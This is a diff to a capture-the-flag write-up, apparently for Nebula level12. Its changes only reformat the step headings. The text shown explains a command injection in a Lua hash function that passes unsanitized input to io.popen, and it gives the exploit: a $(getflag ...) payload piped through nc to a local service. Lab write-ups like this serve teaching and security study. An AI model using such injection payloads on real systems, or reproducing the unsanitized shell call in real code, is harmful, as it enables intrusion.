@@ -64,7 +64,8 @@ The vulnerability lies in the hash function, specifically in this line:
 prog = io.popen("echo "..pass.." | sha1sum", "r")
 ```
 The input pass is directly concatenated into a shell command without any sanitization, leading to a command injection vulnerability.
-Step 3: Exploiting the Vulnerability
+
+### Step 3: Exploiting the Vulnerability
 
 To exploit this vulnerability, we can inject a command to redirect the output of the getflag command to a temporary file.
 
@@ -75,7 +76,7 @@ Here is the exploit command:
 echo -e "\$(getflag > /tmp/level12flag)" | nc localhost 5151 && cat /tmp/level12flag
 ```
 
-Step 4: Executing the Exploit
+### Step 4: Executing the Exploit
     1. Open a terminal and run the following command to connect to the server and inject the payload:
 ```sh
 echo -e "\$(getflag > /tmp/level12flag)" | nc localhost 5151
